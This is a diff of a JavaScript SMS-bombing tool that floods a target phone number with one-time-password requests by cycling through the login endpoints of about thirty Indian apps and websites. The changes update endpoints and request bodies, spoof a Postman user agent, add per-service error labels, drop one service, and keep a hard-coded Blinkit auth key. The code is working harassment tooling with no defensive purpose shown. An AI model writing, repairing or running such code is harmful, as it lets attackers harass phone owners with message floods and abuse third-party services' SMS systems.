@@ -69,7 +69,7 @@ async function mywallety(number) {
 
 async function infinitylearn(number) {
     return new Promise((resolve) => {
-        fetch("https://otp.infinitylearn.com/api/generateOTP", {
+        fetch("https://comservice.infinitylearn.com/api/generate-otp", {
             method: "POST",
             headers: {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
@@ -88,7 +88,7 @@ async function infinitylearn(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch infinitylearn: " + err);
             resolve(false)
         });
     })
@@ -121,7 +121,7 @@ async function my11circle(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: my11circle" + err);
             resolve(false)
         });
 
@@ -150,7 +150,7 @@ async function housing(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: housing" + err);
             resolve(false)
         });
     })
@@ -181,7 +181,7 @@ async function zomato(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: zomato" + err);
             resolve(false)
         });
     })
@@ -213,7 +213,7 @@ async function fantv(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: fantv" + err);
             resolve(false)
         });
     })
@@ -244,7 +244,7 @@ async function byjus(number) {
             }
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: byjus" + err);
             resolve(false)
         });
 
@@ -265,7 +265,7 @@ async function netmeds(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: netmeds" + err);
             resolve(false)
         });
     })
@@ -293,7 +293,7 @@ async function unacademy(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: unacademy" + err);
             resolve(false)
         });
     })
@@ -308,14 +308,16 @@ async function medibuddy(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                "source": "medibuddyInWeb",
-                "platform": "medibuddy",
-                "phonenumber": number,
+                "advertiserId": "9abfa9de-8707-L222-99b2-18bfd2004b8d",
                 "flow": "Retail-Login-Home-Flow",
-                "idealLoginFlow": "false",
-                "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
-                "mbUserId": "null"
-            })
+                "idealLoginFlow": false,
+                "mb-s-platform": "infiniti-web",
+                "mb-s-sessionId": (Date.now()-10000).toString()+"__WEB__EWFI",
+                "mbUserId": null,
+                "phonenumber": number,
+                "platform": "medibuddy",
+                "source": "medibuddyInWeb"
+                })
         }).then((res) => {
             let contenttype = res.headers.get("content-type")
             if (contenttype && contenttype.includes("application/json") === true) {
@@ -328,7 +330,7 @@ async function medibuddy(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: medibuddy" + err);
             resolve(false)
         });
     })
@@ -363,7 +365,7 @@ async function momsco(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: momsco" + err);
             resolve(false)
         });
     })
@@ -418,12 +420,12 @@ async function ajio(number) {
                         resolve(true)
                     resolve(false)
                 }).catch((err) => {
-                    console.log("error occured during fetch: " + err);
+                    console.log("error occured during fetch: ajio 1" + err);
                     resolve(false)
                 });
             }
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: ajio 2" + err);
             resolve(false)
             resolve(false)
         });
@@ -476,12 +478,12 @@ async function nxtwave(number) {
                         })
                     }
                 }).catch((err) => {
-                    console.log("error occured during fetch: " + err);
+                    console.log("error occured during fetch: nxtwave 1" + err);
                     resolve(false)
                 });
             }
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: nxtwave2" + err);
             resolve(false)
         });
     })
@@ -513,7 +515,7 @@ async function tradex(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: tradex" + err);
             resolve(false)
         });
     })
@@ -542,7 +544,7 @@ async function kukufm(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: kukufm" + err);
             resolve(false)
         });
     })
@@ -553,7 +555,7 @@ async function blinkit(number) {
         fetch("https://blinkit.com/v2/accounts/", {
             method: "POST",
             headers: {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+                "User-Agent": "PostmanRuntime/7.42.0",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
             },
@@ -572,7 +574,7 @@ async function blinkit(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: blinkit" + err);
             resolve(false)
         });
     })
@@ -594,7 +596,7 @@ async function jar(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: jar" + err);
             resolve(false)
         });
     })
@@ -627,7 +629,7 @@ async function probo(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: probo" + err);
             resolve(false)
         });
     })
@@ -683,7 +685,7 @@ async function eatclub(number) {
             } else
                 resolve(true)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: eatclub" + err);
             resolve(false)
         });
     })
@@ -746,7 +748,7 @@ async function hoichoi(number) {
             } else
                 resolve(true)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: hoichoi" + err);
             resolve(false)
         });
     })
@@ -781,7 +783,7 @@ async function jiocinema(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: jiocinema" + err);
             resolve(false)
         });
     })
@@ -819,7 +821,7 @@ async function fancode(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: fancode" + err);
             resolve(false)
         });
     })
@@ -841,37 +843,7 @@ async function gamezone(number) {
                     resolve(true)
                 resolve(false)
             }).catch((err) => {
-                console.log("error occured during fetch: " + err);
-                resolve(false)
-            });
-    })
-}
-
-async function meesho(number) {
-    return new Promise((resolve) => {
-        fetch("https://www.meesho.com/api/v1/user/login/request-otp", {
-            method: "POST",
-            headers: {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                "phone_number": number
-            })
-        })
-            .then((res) => {
-                let contenttype = res.headers.get("content-type")
-                if (contenttype && contenttype.includes("application/json") === true) {
-                    return res.json()
-                } else {
-                    resolve(false)
-                }
-            }).then((data) => {
-                if (data?.data)
-                    resolve(true)
-                resolve(false)
-            }).catch((err) => {
-                console.log("error occured during fetch: " + err);
+                console.log("error occured during fetch: gamezone" + err);
                 resolve(false)
             });
     })
@@ -914,7 +886,7 @@ async function zee5(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: zee5" + err);
             resolve(false)
         });
     })
@@ -961,7 +933,7 @@ async function mamaearth(number) {
                 })
             }
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: mamaearth" + err);
             resolve(false)
         });
     })
@@ -1006,12 +978,12 @@ async function derma(number) {
                         resolve(true)
                     resolve(false)
                 }).catch((err) => {
-                    console.log("error occured during fetch: " + err);
+                    console.log("error occured during fetch: derma 1" + err);
                     resolve(false)
                 });
             }
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: derma 2" + err);
             resolve(false)
         });
     })
@@ -1046,7 +1018,7 @@ async function uspolo(number) {
                 resolve(true)
             resolve(false)
         }).catch((err) => {
-            console.log("error occured during fetch: " + err);
+            console.log("error occured during fetch: uspolo" + err);
             resolve(false)
         });
     })
@@ -1062,7 +1034,7 @@ function sleep(time) {
 }
 
 async function sendsms(number, ws, limit, speed) {
-    let list = [ajio, blinkit, byjus, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
+    let list = [ajio, blinkit, byjus, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
     let i = 0, t = 0;
     while (i < limit) {
         let res = await list[t % list.length](number)
